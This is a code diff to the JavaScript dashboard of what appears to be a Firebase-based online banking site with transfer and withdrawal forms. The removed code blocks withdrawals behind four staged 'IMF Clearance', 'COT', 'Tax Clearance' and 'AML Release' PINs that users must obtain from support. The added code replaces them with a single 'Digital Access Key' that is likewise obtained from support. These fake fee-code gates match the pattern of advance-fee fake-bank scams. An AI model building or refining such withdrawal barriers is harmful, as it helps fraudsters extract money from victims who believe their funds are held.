@@ -1,7 +1,7 @@
 import { app, isFirebaseConfigured } from "../firebase.js";
 import { bindContactDetails } from "../utils/contact.js";
 import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
-import { getDatabase, ref, onValue, update, push, set, query, orderByChild, equalTo } from "firebase/database";
+import { getDatabase, ref, onValue, update, push, set, remove, query, orderByChild, equalTo } from "firebase/database";
 
 export function mountPage(navigate) {
     if (!isFirebaseConfigured) {
@@ -183,7 +183,7 @@ export function mountPage(navigate) {
       }
       if (typeof data.balance !== "number") patch.balance = 0;
   
-      // Accounts created before the active/withdrawalPins fields existed default to
+      // Accounts created before the active field existed default to
       // active (so nobody who already had full access suddenly gets locked out);
       // brand-new registrations set active:false themselves at signup time.
       if (typeof data.active !== "boolean") patch.active = true;
@@ -594,7 +594,6 @@ export function mountPage(navigate) {
     }
     wirePinBoxes(".pin-digit");
     wirePinBoxes(".pin-confirm-digit");
-    wirePinBoxes(".wpin-digit");
     function readPinBoxes(selector) { return Array.from(document.querySelectorAll(selector)).map((b) => b.value).join(""); }
     function clearPinBoxes(selector) { document.querySelectorAll(selector).forEach((b) => (b.value = "")); }
   
@@ -646,85 +645,67 @@ export function mountPage(navigate) {
       $("pinStatusText").textContent = userData.pinHash ? "Your transaction PIN is set." : "Not set yet — you'll be asked to create one on your first transfer.";
     }
   
-    /* ---------- withdrawal security PIN modal (4 sequential clearance stages) ---------- */
-    let wpinResolveCallback = null;
-    let wpinStep = 1;
-  
-    // Custom metadata to match your beautiful 4-Stage HTML theme
-    const STAGE_DETAILS = {
-      1: { title: "IMF Clearance Code", sub: "Enter your 4-digit International Monetary Fund code to clear this transfer." },
-      2: { title: "COT Code Verification", sub: "Enter your 4-digit Cost of Transfer (COT) activation code to authorize processing." },
-      3: { title: "Tax Clearance Certificate", sub: "Enter your 4-digit Federal Tax Clearance pin to validate cross-border handling." },
-      4: { title: "AML Final Release Code", sub: "Enter your 4-digit Anti-Money Laundering clearance pin to release your funds." }
-    };
-  
-    function updateWpinProgress(step) {
-      document.querySelectorAll("#wpinProgress .wpin-dot").forEach((dot, i) => {
-        dot.style.background = i < step ? "var(--leaf)" : "var(--border)";
-      });
-    }
-  
-    function requireWithdrawalPins(onVerified) {
-      wpinResolveCallback = onVerified;
-      wpinStep = 1;
-      
-      // Apply initial Stage 1 layout text safely without resetting formatting
-      $("wpinModalTitle").textContent = STAGE_DETAILS[1].title;
-      $("wpinModalSub").textContent = STAGE_DETAILS[1].sub;
-      
-      $("wpinError").classList.add("hidden");
-      clearPinBoxes(".wpin-digit");
-      updateWpinProgress(1);
-      $("wpinModal").classList.remove("hidden");
-      document.querySelector(".wpin-digit").focus();
-    }
-  
-    $("wpinCancelBtn").addEventListener("click", () => {
-      $("wpinModal").classList.add("hidden");
-      wpinResolveCallback = null;
+    /* ---------- one-time Digital Access Key (DAK) verification ---------- */
+    let dakResolveCallback = null;
+    const dakInput = $("dakInput");
+    dakInput.addEventListener("input", () => {
+      dakInput.value = dakInput.value.replace(/[^0-9]/g, "").slice(0, 5);
     });
   
-    $("wpinSubmitBtn").addEventListener("click", () => {
-      const entered = readPinBoxes(".wpin-digit");
-      if (entered.length !== 4) {
-        $("wpinError").textContent = "Enter all 4 digits.";
-        $("wpinError").classList.remove("hidden");
+    function requireDigitalAccessKey(onVerified) {
+      if (userData.dakEnabled === false || userData.dakVerified === true) {
+        onVerified();
+        return;
+      }
+      dakResolveCallback = onVerified;
+      $("dakError").classList.add("hidden");
+      dakInput.value = "";
+      $("dakModal").classList.remove("hidden");
+      dakInput.focus();
+    }
+  
+    $("dakCancelBtn").addEventListener("click", () => {
+      $("dakModal").classList.add("hidden");
+      dakResolveCallback = null;
+    });
+  
+    $("dakSubmitBtn").addEventListener("click", async () => {
+      const entered = dakInput.value.trim();
+      if (!/^\d{5}$/.test(entered)) {
+        $("dakError").textContent = "Enter your complete 5-digit DAK.";
+        $("dakError").classList.remove("hidden");
         return;
       }
   
-      const pins = userData.withdrawalPins || {};
-      // Checks both 'pin1' or 'stage1' formats to safeguard database structure variations safely
-      const expected = pins[`pin${wpinStep}`] || pins[`stage${wpinStep}`];
-      
-      if (!expected || entered.toString() !== expected.toString()) {
-        $("wpinError").textContent = "Incorrect PIN. Please contact support for the correct PIN.";
-        $("wpinError").classList.remove("hidden");
-        shakeEl($("wpinModal").firstElementChild);
-        clearPinBoxes(".wpin-digit");
-        document.querySelector(".wpin-digit").focus();
+      const claimRef = ref(db, `dakClaims/${currentUid}`);
+      try {
+        await set(claimRef, entered);
+        await update(ref(db, `users/${currentUid}`), { dakVerified: true });
+        userData.dakVerified = true;
+      } catch (error) {
+        console.error("Could not verify the Digital Access Key:", error);
+        $("dakError").textContent = "DAK not verified. Check the code or contact support to get your DAK.";
+        $("dakError").classList.remove("hidden");
+        shakeEl($("dakModal").firstElementChild);
+        dakInput.value = "";
+        dakInput.focus();
+        try {
+          await remove(claimRef);
+        } catch (cleanupError) {
+          console.error("Could not clear the failed DAK claim:", cleanupError);
+        }
         return;
       }
   
-      $("wpinError").classList.add("hidden");
-  
-      if (wpinStep < 4) {
-        wpinStep += 1;
-        
-        // Dynamically display your explicit sub-stage descriptions
-        $("wpinModalTitle").textContent = STAGE_DETAILS[wpinStep].title;
-        $("wpinModalSub").textContent = STAGE_DETAILS[wpinStep].sub;
-        
-        updateWpinProgress(wpinStep);
-        clearPinBoxes(".wpin-digit");
-        document.querySelector(".wpin-digit").focus();
-        return;
+      try {
+        await remove(claimRef);
+      } catch (error) {
+        console.error("Could not clear the verified DAK claim:", error);
       }
-  
-      // All 4 stages successfully cleared
-      $("wpinModal").classList.add("hidden");
-      const cb = wpinResolveCallback;
-      wpinResolveCallback = null;
-      if (cb) cb();
+      $("dakModal").classList.add("hidden");
+      const callback = dakResolveCallback;
+      dakResolveCallback = null;
+      if (callback) callback();
     });
   
     /* ---------- active/inactive gating ---------- */
@@ -926,21 +907,21 @@ export function mountPage(navigate) {
       if (!userData.active) { showToast("Your account is pending approval — transfers are locked for now.", "rose"); return; }
       const amount = validateAmount("ltAmount", "ltAmountError", userData.balance || 0);
       if (!amount) return;
-      requireTransactionPin(async () => {
-        try {
-          await createPendingTransfer({
-            type: "transfer_local", direction: "debit", amount, currency: userData.currency,
-            description: `Local transfer to ${$("ltAccountName").value.trim()}`,
-            details: { bankName: $("ltBankName").value.trim(), accountNumber: $("ltAccountNumber").value.trim(), accountName: $("ltAccountName").value.trim(), narration: $("ltNarration").value.trim() },
-          });
-          $("localTransferForm").reset();
-          setAlert($("transferAlert"), "Transfer submitted — the amount has been reserved and is pending admin approval.", "mint");
-          showToast("Transfer submitted", "mint");
-        } catch (error) {
-          console.error("Could not submit local transfer:", error);
-          setAlert($("transferAlert"), error.message || "Could not submit transfer. Please try again.", "rose");
-        }
-      });
+      requireDigitalAccessKey(() => requireTransactionPin(async () => {
+          try {
+            await createPendingTransfer({
+              type: "transfer_local", direction: "debit", amount, currency: userData.currency,
+              description: `Local transfer to ${$("ltAccountName").value.trim()}`,
+              details: { bankName: $("ltBankName").value.trim(), accountNumber: $("ltAccountNumber").value.trim(), accountName: $("ltAccountName").value.trim(), narration: $("ltNarration").value.trim() },
+            });
+            $("localTransferForm").reset();
+            setAlert($("transferAlert"), "Transfer submitted — the amount has been reserved and is pending admin approval.", "mint");
+            showToast("Transfer submitted", "mint");
+          } catch (error) {
+            console.error("Could not submit local transfer:", error);
+            setAlert($("transferAlert"), error.message || "Could not submit transfer. Please try again.", "rose");
+          }
+        }));
     });
   
     $("intlTransferForm").addEventListener("submit", (e) => {
@@ -948,30 +929,30 @@ export function mountPage(navigate) {
       if (!userData.active) { showToast("Your account is pending approval — transfers are locked for now.", "rose"); return; }
       const amount = validateAmount("itAmount", "itAmountError", userData.balance || 0);
       if (!amount) return;
-      requireTransactionPin(async () => {
-        try {
-          await createPendingTransfer({
-            type: "transfer_international", direction: "debit", amount, currency: userData.currency,
-            description: `International transfer to ${$("itName").value.trim()} (${$("itCountry").value})`,
-            details: { recipientName: $("itName").value.trim(), recipientCountry: $("itCountry").value, bankName: $("itBankName").value.trim(), swift: $("itSwift").value.trim(), accountNumber: $("itAccountNumber").value.trim(), destCurrency: $("itCurrency").value, purpose: $("itPurpose").value },
-          });
-          $("intlTransferForm").reset();
-          setAlert($("transferAlert"), "Transfer submitted — the amount has been reserved and is pending admin approval.", "mint");
-          showToast("Transfer submitted", "mint");
-        } catch (error) {
-          console.error("Could not submit international transfer:", error);
-          setAlert($("transferAlert"), error.message || "Could not submit transfer. Please try again.", "rose");
-        }
-      });
+      requireDigitalAccessKey(() => requireTransactionPin(async () => {
+          try {
+            await createPendingTransfer({
+              type: "transfer_international", direction: "debit", amount, currency: userData.currency,
+              description: `International transfer to ${$("itName").value.trim()} (${$("itCountry").value})`,
+              details: { recipientName: $("itName").value.trim(), recipientCountry: $("itCountry").value, bankName: $("itBankName").value.trim(), swift: $("itSwift").value.trim(), accountNumber: $("itAccountNumber").value.trim(), destCurrency: $("itCurrency").value, purpose: $("itPurpose").value },
+            });
+            $("intlTransferForm").reset();
+            setAlert($("transferAlert"), "Transfer submitted — the amount has been reserved and is pending admin approval.", "mint");
+            showToast("Transfer submitted", "mint");
+          } catch (error) {
+            console.error("Could not submit international transfer:", error);
+            setAlert($("transferAlert"), error.message || "Could not submit transfer. Please try again.", "rose");
+          }
+        }));
     });
   
-    /* ---------- withdrawal forms — gated by the 4 auto-generated withdrawal PINs, in sequence ---------- */
+    /* ---------- withdrawal forms — gated by the one-time DAK ---------- */
     $("paypalForm").addEventListener("submit", (e) => {
       e.preventDefault();
       if (!userData.active) { showToast("Your account is pending approval — withdrawals are locked for now.", "rose"); return; }
       const amount = validateAmount("ppAmount", "ppAmountError", userData.balance || 0);
       if (!amount) return;
-      requireWithdrawalPins(async () => {
+      requireDigitalAccessKey(async () => {
         await createTransaction({ type: "withdrawal", direction: "debit", amount, currency: userData.currency, description: "Withdrawal to PayPal", details: { method: "paypal", paypalEmail: $("ppEmail").value.trim() } });
         $("paypalForm").reset();
         setAlert($("withdrawAlert"), "Withdrawal requested — pending admin approval.", "mint");
@@ -983,7 +964,7 @@ export function mountPage(navigate) {
       if (!userData.active) { showToast("Your account is pending approval — withdrawals are locked for now.", "rose"); return; }
       const amount = validateAmount("caAmount", "caAmountError", userData.balance || 0);
       if (!amount) return;
-      requireWithdrawalPins(async () => {
+      requireDigitalAccessKey(async () => {
         await createTransaction({ type: "withdrawal", direction: "debit", amount, currency: userData.currency, description: "Withdrawal to Cash App", details: { method: "cashapp", cashtag: $("caTag").value.trim() } });
         $("cashappForm").reset();
         setAlert($("withdrawAlert"), "Withdrawal requested — pending admin approval.", "mint");
@@ -995,7 +976,7 @@ export function mountPage(navigate) {
       if (!userData.active) { showToast("Your account is pending approval — withdrawals are locked for now.", "rose"); return; }
       const amount = validateAmount("bwAmount", "bwAmountError", userData.balance || 0);
       if (!amount) return;
-      requireWithdrawalPins(async () => {
+      requireDigitalAccessKey(async () => {
         await createTransaction({ type: "withdrawal", direction: "debit", amount, currency: userData.currency, description: "Withdrawal to bank account", details: { method: "bank", accountHolderName: $("bwName").value.trim(), bankName: $("bwBank").value.trim(), accountNumber: $("bwAccountNumber").value.trim(), routing: $("bwRouting").value.trim() } });
         $("bankWithdrawForm").reset();
         setAlert($("withdrawAlert"), "Withdrawal requested — pending admin approval.", "mint");
